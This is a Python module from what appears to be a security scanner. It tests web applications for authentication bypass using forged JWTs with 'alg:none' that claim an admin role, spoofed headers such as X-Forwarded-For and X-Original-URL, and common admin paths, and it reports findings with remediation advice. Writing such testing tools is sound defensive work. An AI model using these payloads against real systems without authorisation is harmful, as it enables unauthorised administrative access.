"""Authentication bypass detection — JWT, OAuth, SAML, session attacks."""

from __future__ import annotations

import base64
import json
import re

from basilisk.models import Finding
from basilisk.scoring import score_finding


JWT_NONE_ALG = [
    "eyJhbGciOiJub25lIn0.",  # {"alg":"none"}
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.",  # {"typ":"JWT","alg":"none"}
]
JWT_WEAK_ALG = [
    "eyJhbGciOiJIUzI1NiJ9.",  # {"alg":"HS256"}
    "eyJhbGciOiJIUzI1NiJ9.",  # {"alg":"HS256"}
]
JWT_PAYLOADS = JWT_NONE_ALG + [
    j + base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}'.ljust(32, b'\x00')).rstrip(b"=").decode() + ".signature"
    for j in JWT_NONE_ALG
]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Proto": "https"},
    {"X-Auth-Type": "bypass"},
    {"X-Admin": "true"},
    {"X-Roles": "admin"},
    {"Impersonate-User": "admin"},
    {"Authorization": "Bearer admin"},
    {"Cookie": "admin=true; role=admin"},
]

AUTH_BYPASS_PATHS = [
    "/admin", "/api/admin", "/wp-admin", "/administrator",
    "/manager", "/console", "/actuator",
    "/admin/", "/api/internal",
]


def decode_jwt(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            return json.loads(decoded)
    except Exception:
        return None
    return None


def detect_jwt_none_alg(response: dict, payload: str, target: str = "") -> Finding | None:
    body = response.get("body", "")
    status = response.get("status_code", 0)

    if status in (200, 201, 202):
        token_data = decode_jwt(payload)
        if token_data and token_data.get("role") == "admin":
            cvss, vector = score_finding("auth_bypass")
            return Finding(
                vulnerability="JWT Authentication Bypass (alg:none)",
                severity="Critical",
                description="Server accepted JWT with 'alg: none'. Full authentication bypass achieved.",
                target=target,
                attack_type="auth_bypass",
                payload=payload[:80],
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Do not accept 'none' algorithm. Enforce strong algorithm validation in JWT libraries.",
            )
        if status in (200, 201):
            cvss, vector = score_finding("auth_bypass")
            return Finding(
                vulnerability="Potential Auth Bypass",
                severity="High",
                description=f"Auth bypass payload returned HTTP {status}: {payload[:60]}",
                target=target,
                attack_type="auth_bypass",
                payload=payload[:80],
                cvss_score=cvss,
                cvss_vector=vector,
                confidence=0.5,
            )

    return None


def detect_header_bypass(
    response: dict, headers: dict, path: str, target: str = ""
) -> Finding | None:
    status = response.get("status_code", 0)
    body = response.get("body", "")

    if status in (200, 201, 202, 301, 302) and len(body) > 50:
        cvss, vector = score_finding("auth_bypass")
        header_str = "; ".join(f"{k}: {v}" for k, v in headers.items())
        return Finding(
            vulnerability="Authentication Bypass via Headers",
            severity="Critical",
            description=f"Access granted with auth bypass headers ({header_str}) to {path} (HTTP {status}).",
            target=target,
            attack_type="auth_bypass",
            payload=header_str[:80],
            cvss_score=cvss,
            cvss_vector=vector,
            remediation="Validate authentication server-side. Do not rely on client-provided headers for auth decisions.",
        )

    return None


def get_jwt_payloads() -> list[str]:
    return list(JWT_PAYLOADS)

def get_bypass_headers() -> list[dict]:
    return list(AUTH_BYPASS_HEADERS)

def get_bypass_paths() -> list[str]:
    return list(AUTH_BYPASS_PATHS)
